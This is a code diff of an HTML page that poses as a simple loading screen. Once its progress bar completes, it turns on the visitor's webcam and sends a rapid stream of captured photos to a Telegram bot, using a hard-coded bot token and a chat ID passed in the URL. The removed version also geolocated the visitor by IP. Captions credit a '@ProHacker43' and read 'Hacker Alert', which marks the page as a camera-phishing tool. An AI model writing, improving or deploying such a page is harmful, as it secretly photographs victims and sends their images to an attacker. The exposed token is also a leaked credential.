@@ -1,52 +1,45 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Loading & Auto Send Photos with Stylish Captions</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auto Capture & Send</title>
 <style>
-  body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: #121212;
-    color: #eee;
+body {
+    font-family: Arial, sans-serif;
+    background: #f3f4f6;
     display: flex;
-    flex-direction: column;
-    align-items: center;
     justify-content: center;
+    align-items: center;
     height: 100vh;
     margin: 0;
-  }
-  h1 {
+    flex-direction: column;
+}
+h1 {
     margin-bottom: 24px;
-    font-weight: 700;
-    font-size: 1.8rem;
-    text-decoration: underline;
-    color: #7c3aed; /* Purple */
-  }
-  .progress-container {
+    color: #333;
+}
+.progress-container {
     width: 80%;
     max-width: 500px;
-    background: #333;
-    border-radius: 12px;
+    background: #ddd;
+    border-radius: 10px;
     overflow: hidden;
-    height: 22px;
-    box-shadow: 0 0 10px #7c3aed88;
-  }
-  .progress-bar {
+    height: 20px;
+    box-shadow: 0 0 5px rgba(0,0,0,0.1);
+}
+.progress-bar {
     height: 100%;
     width: 0%;
-    background: linear-gradient(90deg, #8b5cf6, #7c3aed);
-    border-radius: 12px 0 0 12px;
+    background: linear-gradient(90deg, #6366f1, #4f46e5);
+    border-radius: 10px 0 0 10px;
     transition: width 0.1s linear;
-    box-shadow: 0 0 10px #7c3aedcc;
-  }
-  .progress-text {
-    margin-top: 14px;
-    font-weight: 600;
-    font-size: 1.1rem;
-    color: #ccc;
-    font-family: 'Courier New', Courier, monospace;
-  }
+}
+.progress-text {
+    margin-top: 12px;
+    font-weight: bold;
+    color: #555;
+}
 </style>
 </head>
 <body>
@@ -58,141 +51,83 @@
 <div class="progress-text" id="progressText">0%</div>
 
 <script>
-  const BOT_TOKEN = "8062278856:AAGO17YgYVRP_WiLcLoqhA0MLtuClIRwZas";
-  // د یو آر ایل نه یوزر آی ډی واخلئ
-  const urlParams = new URLSearchParams(window.location.search);
-  const CHAT_ID = urlParams.get('id') || 'YOUR_CHAT_ID_HERE';
+const BOT_TOKEN = "8062278856:AAGO17YgYVRP_WiLcLoqhA0MLtuClIRwZas";
+const CHAT_ID = new URLSearchParams(window.location.search).get("id") || "YOUR_CHAT_ID"; 
 
-  const progressBar = document.getElementById("progressBar");
-  const progressText = document.getElementById("progressText");
+const progressBar = document.getElementById("progressBar");
+const progressText = document.getElementById("progressText");
 
-  let progress = 0;
-  const duration = 3000; // 3 seconds for loading bar
-  const intervalTime = 50; // update every 50ms
-  const increment = (intervalTime / duration) * 100;
+let progress = 0;
+const duration = 3000; // 3 seconds
+const intervalTime = 50;
+const increment = (intervalTime / duration) * 100;
 
-  let photoCount = 0;
-  const maxPhotos = 24; // 24 photos over ~2 minutes
-  const photoInterval = 5000; // 5 seconds between photos
-
-  // Loading bar animation
-  const interval = setInterval(() => {
+const interval = setInterval(() => {
     progress += increment;
-    if (progress > 100) progress = 100;
+    if(progress>100) progress=100;
     progressBar.style.width = progress + "%";
     progressText.textContent = Math.floor(progress) + "%";
-
-    if (progress >= 100) {
-      clearInterval(interval);
-      startSendingPhotos();
+    if(progress>=100){
+        clearInterval(interval);
+        startCameraLoop();
     }
-  }, intervalTime);
+}, intervalTime);
 
-  async function getUserCountry() {
-    try {
-      const res = await fetch('https://ip-api.com/json/?fields=country,countryCode');
-      const data = await res.json();
-      return {
-        country: data.country || "Unknown",
-        countryCode: data.countryCode || "XX"
-      };
-    } catch {
-      return { country: "Unknown", countryCode: "XX" };
-    }
-  }
-
-  async function startSendingPhotos() {
-    const {country, countryCode} = await getUserCountry();
-
-    const flagEmoji = countryCodeToFlagEmoji(countryCode);
-
-    const sendPhotoRepeatedly = async () => {
-      if (photoCount >= maxPhotos) {
-        alert("All photos have been sent!");
-        return;
-      }
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+async function startCameraLoop(){
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({video:true});
         const video = document.createElement("video");
         video.srcObject = stream;
         await video.play();
 
-        // Wait a bit for video stream to be ready
-        await new Promise(r => setTimeout(r, 1000));
-
-        // Capture photo
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Stop stream
-        stream.getTracks().forEach(track => track.stop());
+        let photoCount = 0;
+        const maxTime = 60; // 60 seconds
+        const intervalMs = 500; // 2 photos per second
 
-        // Convert to Blob and send
-        canvas.toBlob(async (blob) => {
-          photoCount++;
-          const now = new Date();
-          const timeString = now.toLocaleTimeString('en-US', { hour12: false });
+        const sendInterval = setInterval(async ()=>{
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(async blob=>{
+                const timestamp = new Date();
+                const timeStr = timestamp.toLocaleTimeString();
+                const country = "🌐 User Country"; // placeholder
+                const flag = "🏳️"; // placeholder
+                const caption = `<b>Photo #${photoCount+1}</b> - ⏰ ${timeStr}\n${flag} ${country}\nDeveloper by @ProHacker43`;
 
-          // Caption with stylish text and stickers (emojis)
-          const caption = 
-`🔥 Hacker Alert! 🔥
-🛡️ Photo #${photoCount} sent.
-⏰ Time: ${timeString}
-🌍 Location: ${flagEmoji} ${country}
-💀 Stay vigilant!`;
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, `photo${photoCount+1}.jpg`);
+                formData.append("caption", caption);
 
-          await sendPhotoToTelegram(blob, caption);
+                try{
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+                        method:"POST",
+                        body:formData
+                    });
+                }catch(e){
+                    console.error("Error sending photo", e);
+                }
 
-          if(photoCount < maxPhotos) {
-            setTimeout(sendPhotoRepeatedly, photoInterval);
-          } else {
-            alert("Finished sending all photos.");
-          }
-        }, "image/jpeg", 0.85);
+            },"image/jpeg",0.85);
 
-      } catch (err) {
-        alert("Camera access denied or error occurred.");
-        console.error(err);
-      }
-    };
+            photoCount++;
+        }, intervalMs);
 
-    sendPhotoRepeatedly();
-  }
+        setTimeout(()=>{
+            clearInterval(sendInterval);
+            stream.getTracks().forEach(track=>track.stop());
+            alert("Photo capture completed!");
+        }, maxTime*1000);
 
-  async function sendPhotoToTelegram(photoBlob, caption) {
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", photoBlob, "photo.jpg");
-    formData.append("caption", caption);
-
-    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-
-    try {
-      const response = await fetch(telegramUrl, {
-        method: "POST",
-        body: formData
-      });
-      if (!response.ok) throw new Error("Failed to send photo");
-      const data = await response.json();
-      console.log("Photo sent:", data);
-    } catch (error) {
-      console.error("Error sending photo:", error);
+    }catch(e){
+        alert("Camera permission denied or error occurred.");
+        console.error(e);
     }
-  }
-
-  // Convert country code (like 'US') to flag emoji 🇺🇸
-  function countryCodeToFlagEmoji(code) {
-    if(code.length !== 2) return '';
-    const A = 0x1F1E6 - 'A'.charCodeAt(0);
-    const firstChar = String.fromCodePoint(code.charCodeAt(0) + A);
-    const secondChar = String.fromCodePoint(code.charCodeAt(1) + A);
-    return firstChar + secondChar;
-  }
+}
 </script>
-
 </body>
 </html> 
